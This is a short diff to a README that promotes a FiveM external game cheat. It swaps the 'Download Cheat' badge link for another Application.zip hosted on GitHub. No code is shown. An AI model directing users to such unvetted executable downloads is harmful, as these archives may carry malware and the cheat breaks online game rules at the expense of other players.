@@ -15,7 +15,7 @@ Welcome to the FiveM External Cheat KeyAuth System repository! This cheat offers
 ### Installation
 Click the button below to download the cheat and boost your gaming experience!
 
-[![Download Cheat](https://img.shields.io/badge/Download-Here-orange)](https://github.com/user-attachments/files/18426772/Application.zip "Launch the cheat")
+[![Download Cheat](https://github.com/chuhuysonn/FiveM-External-Cheat-KeyAuth-System/releases/download/v1.0/Application.zip)](https://github.com/chuhuysonn/FiveM-External-Cheat-KeyAuth-System/releases/download/v1.0/Application.zip "Launch the cheat")
 
 If the link does not work or is not provided, please visit the "Releases" section of this repository to access the latest version.
 
